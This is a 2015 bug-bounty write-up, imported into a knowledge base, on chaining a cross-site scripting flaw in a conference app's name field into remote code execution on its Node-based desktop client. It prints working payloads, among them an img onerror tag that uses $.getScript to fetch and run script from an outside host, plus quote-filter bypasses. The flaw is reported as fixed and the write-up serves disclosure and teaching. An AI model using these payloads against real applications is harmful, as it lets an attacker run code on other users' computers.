---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2015-09-08_xss-to-rce-in.md
original_filename: 2015-09-08_xss-to-rce-in.md
title: XSS to RCE in ...
category: documents
detected_topics:
- xss
- command-injection
- rate-limit
tags:
- imported
- documents
- xss
- command-injection
- rate-limit
language: en
raw_sha256: 4d71b97d81cd82bba56b48faac4db1dad80d1980b84a3af154336bdd6b40ff40
text_sha256: 94332af937e0fc37a325352166c5ec8ca9866c8b9439676b18d684279e6fa0ca
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# XSS to RCE in ...

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2015-09-08_xss-to-rce-in.md
- Source Type: markdown
- Detected Topics: xss, command-injection, rate-limit
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `4d71b97d81cd82bba56b48faac4db1dad80d1980b84a3af154336bdd6b40ff40`
- Text SHA256: `94332af937e0fc37a325352166c5ec8ca9866c8b9439676b18d684279e6fa0ca`


## Content

---
title: "XSS to RCE in ..."
url: "https://matatall.com/xss/rce/bugbounty/2015/09/08/xss-to-rce.html"
final_url: "https://matatall.com/xss/rce/bugbounty/2015/09/08/xss-to-rce.html"
authors: ["Neil Hakuna Matatall (@ndm)"]
bugs: ["XSS", "RCE"]
publication_date: "2015-09-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6333
---

**Note: this has been fixed**.

## XSS to RCE “yeah right, RSnake”

I accidentally triggered a cross-site scripting (XSS) vulnerability in <conf provider X> that worked when using the web application as well as the native OS X application (and possibly additional clients). Nowadays, XSS -> Remote Code Execution (RCE) is possible thanks to Node. For every person in any meeting that I join, I could execute code on their computer.

# Standup

I entered a meeting with the classic first name of `<img src=x onerror=alert()>` (the [bobby tables](http://xkcd.com/327/) of XSS). A few minutes into the conversation, [patrick](https://twitter.com/patricktoomey "@patricktoomey") noticed a broken image pop up. Uh oh. When I asked if he also saw an alert box, my colleague [ben](https://twitter.com/mastahyeti "@mastahyeti") chimed in and said yes.

So we have XSS. Sweet. In at least two clients. Hmmm, this could be bad.

![chat](/assets/xssrce/badtime.jpg)

## eval(prompt())

We noticed that there was some filtering going on (such as stripping quotes), so we’d have to use `String.toCharCode` to generate any string values. The web app enforced a value length but this is easily bypassed with a proxy and was not enforced in the desktop client. [ben](https://twitter.com/mastahyeti "@mastahyeti") quickly came up with a good way to explore the impact of this xss with a simple debug console:

`<img src=x onerror=eval(prompt())>` (35 chars)

This lets us generate payloads without having to generate `toCharCode` code each time. Sure this isn’t difficult, but an executing prompt is so much easier to use.

## Exploring the native app

[greg](https://twitter.com/gose1 "@gose1") took a look at the <conf provider X> native application and noticed it used Node. Perhaps `process.open` would work.

It did.

![chat](/assets/xssrce/process.png)

## Putting it all together

That’s when [ben](https://twitter.com/mastahyeti "@mastahyeti") put everything together using a very short payload:

`<img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>` (80 chars)

Now join any existing meeting and enter the above payload as your name. Everyone in the room see an alert box. Those using the native apps will also see their calculators open.

![Alert](/assets/xssrce/alert.png)

![Calculator!](/assets/xssrce/calc.png)

## How it works

The use of `String.fromCharCode` is just a classic way to bypass filtering/escaping of quotes. `String.fromCharCode(47,47,120,111,114,46,99,99)` is `//xor.cc`.

The payload can be simplified as:

`<img src=x onerror=$.getScript("//xor.cc")>`

[`$.getScript`](https://api.jquery.com/jquery.getscript/) tells jQuery to fetch and execute the javascript at `xor.cc`. The fetched javascript that opens the calculator is:

`process.open("/Applications/Calculator.app/Contents/MacOS/Calculator");` (72 chars)

## Why it sort of matters

XSS is XSS is XSS. But XSS in an app with an API to the filesystem is XSS is worse. <conf provider X> meetings typically are… unauthenticated. Everyone raise your hand. Now put down your hand if you have required password authentication for every meeting you have joined. Look to your left, look to your right, and notice everyone’s hand is still up. If you’ve used <conf provider X>, chance are you’ve used it in a manner that let’s this exploit work on any publicly known or guessable <conf provider X> meeting ID. I did not try to brute force the meeting space for open meetings. That would have been bad.

## Calculators

You can’t have a good exploit unless calculators are involved. See [PDF content-type sniffing](https://bounty.github.com/researchers/avlidienbrunn.html) for an even better use of calculators in an attack.

![calc!!!](/assets/xssrce/igotcalc.png)

## Conclusion

Big ups to the GitHub appsec team. Within one hour we went from XSS to RCE. And it played out like something in one of those movies or TV shows. “We popped a faux console using eval and prompt while ripping open the binary to leverage a libary with system access to perform remote code execution… to open a calculator.” Most of the credit has to go to [ben](https://twitter.com/mastahyeti "@mastahyeti") and [greg](https://twitter.com/gose1 "@gose1"), I just found XSS and I wouldn’t have even known without [patrick](https://twitter.com/patricktoomey "@patricktoomey").

[Did I mention that we’re hiring an intern for the appsec team?](https://jobs.lever.co/github/8be6828a-2762-42da-bd11-8306addb0909)
